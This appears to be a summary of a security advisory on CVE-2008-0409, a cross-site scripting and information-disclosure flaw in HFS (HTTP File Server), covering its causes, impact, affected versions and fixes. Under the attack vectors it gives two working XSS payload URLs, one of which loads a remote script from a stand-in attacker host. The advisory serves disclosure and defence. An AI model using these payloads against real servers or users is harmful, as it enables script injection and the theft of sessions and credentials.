Based on the provided content, here's a breakdown of the vulnerability described in CVE-2008-0409:

**Root Cause of Vulnerability:**
The vulnerability stems from the way HFS (HTTP File Server) processes specific URLs, particularly when a non-existent account name is provided. This input is not properly sanitized and is reflected in the server's response.

**Weaknesses/Vulnerabilities Present:**
*   **Cross-Site Scripting (XSS):** The primary vulnerability is XSS. The server renders HTML code present within the non-existent username as part of the page.
*   **Host Field XSS:**  The "Host" field in the HTTP request is also vulnerable to XSS injection through similar injection methods. The server does not sanitize input in the host field properly.
*   **Information Disclosure:** Due to the templating mechanism of HFS, HTML code injected can contain special symbols that force the server to reveal sensitive information such as server version, build, connections, timestamps, uptime, speed, etc.

**Impact of Exploitation:**
*   **Arbitrary Script Execution:** An attacker can inject malicious JavaScript code that will be executed within the victim's browser when they access the crafted URL. This can lead to session hijacking, cookie theft, defacement, redirection to malicious sites, etc.
*   **Information Disclosure:** Sensitive information about the server can be obtained by an attacker.
*   **Password Exposure (Firefox Specific):**  When the attack is launched against Firefox, the user-supplied authentication credentials are re-submitted each time the hostname is visited during the current session, increasing the likelihood of exposure. This is exacerbated by Firefox hiding the information before the "@" symbol, making it less obvious to the user that they are being targeted.

**Attack Vectors:**
*   **Malicious URLs:** Attackers craft URLs with embedded malicious HTML/JavaScript within the username component of the URL.
    *   Example URL:  `http://<script>alert('Syhunt%20XSS')<%2fscript>a:x@[host]/`
    *   Example URL (external script): `http://<script>var%20sChar=String%2efromCharCode(58)%3bdocument%2ewrite('<script%20src=http'+sChar+'%2f%2fwww%2eattacker%2ecom%2fxss%2ejs><%5c%2fscript>')%3b<%2fscript>a:x@[host]/`
    *   The `@` is a key component of this attack, exploiting a parsing/rendering bug in Firefox, while also allowing HFS to parse this as a template.

**Required Attacker Capabilities/Position:**
*   **Remote:** The attacker can exploit this vulnerability remotely via crafted HTTP requests.
*   **User Interaction (Partial):** The victim user must click the crafted URL or be redirected to it.
*   **Authentication (Conditional):** For the "Host Field XSS" to be fully exploited with the Firefox credential re-submission the victim needs to be logged in and the current (root) path should not be password protected in the HFS-VFS panel.

**Additional Details**
The provided content also includes an exploit script (`HFSHack`) that can be used to test for this vulnerability (and others).  It also highlights:

*   The vulnerability is present in HFS versions 2.0 up to and including 2.3 (Beta build 174).
*   HFS 1.6a and earlier versions are not affected.
*   The vendor has released a patch (version 2.2c).
*   A workaround for affected versions involves removing the `%user%` and `%host%` symbols from HFS HTML templates.
*   HFS 2.3 Beta is only vulnerable when the "Accept any login for unprotected resources" option is enabled. This option is disabled by default.
